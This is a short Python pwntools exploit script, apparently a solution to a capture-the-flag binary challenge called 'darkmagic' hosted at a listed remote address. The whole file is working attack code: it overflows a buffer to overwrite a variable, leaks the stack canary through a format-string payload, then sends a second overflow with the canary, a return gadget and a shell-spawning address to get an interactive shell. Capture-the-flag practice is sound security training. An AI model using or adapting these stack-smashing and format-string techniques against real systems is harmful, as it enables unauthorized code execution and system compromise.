from pwn import *
elf = ELF('/home/kali/Downloads/pwn_darkmagic_darkmagic-(1)')
p=elf.process()

cyberedu = '35.246.200.178:30814'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
    

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#%57$p e canary

#100 bytes buf
payload1 = b'A'*100
#4 byte v3, turn v3 to 0x3
payload1 += p32(0x2)
payload1 += b'\n'

payload2=b'%35$p'
payload2+=b'\n'

p.recvuntil(b'!\n')
p.send(payload1)
p.send(payload2)
#p.sendline(b'\n'*5)

p.recvuntil('A\x02')
canary = int(p.recvline().strip(), 16)
print(hex(canary))


getshell = 0x400737
main = 0x400850
ret=0x4005d6

payload1 = b'nothing important\x00'
payload1+=b'\n'

#v3 i guess 
p.send(payload1)

payload2=b'b'*112
payload2+=p64(canary)
#payload2+=p64(0x9)

#rbp
payload2+=b'b'*8
payload2+=p64(ret)
payload2+=p64(getshell)
payload2+=b'\n'

print(payload2)

p.send(payload2)


p.interactive()
